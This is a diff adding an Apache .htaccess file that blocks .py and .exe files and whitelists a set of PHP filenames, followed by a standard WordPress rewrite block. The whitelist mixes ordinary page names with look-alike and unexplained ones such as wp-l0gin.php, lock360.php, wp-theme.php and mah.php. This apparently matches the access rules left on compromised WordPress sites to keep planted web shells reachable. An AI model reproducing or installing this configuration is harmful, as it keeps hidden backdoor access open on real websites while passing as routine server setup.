@@ -1,0 +1,16 @@
+<FilesMatch ".(py|exe)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(about.php|about-mfm.php|radio.php|index.php|content.php|lock360.php|admin.php|wp-login.php|wp-l0gin.php|wp-theme.php|wp-scripts.php|wp-editor.php|mah.php|jp.php|ext.php|how-it-works.php|call-for-entry.php|behind-the-scenes.php|selecteds.php|members|register.php|login.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
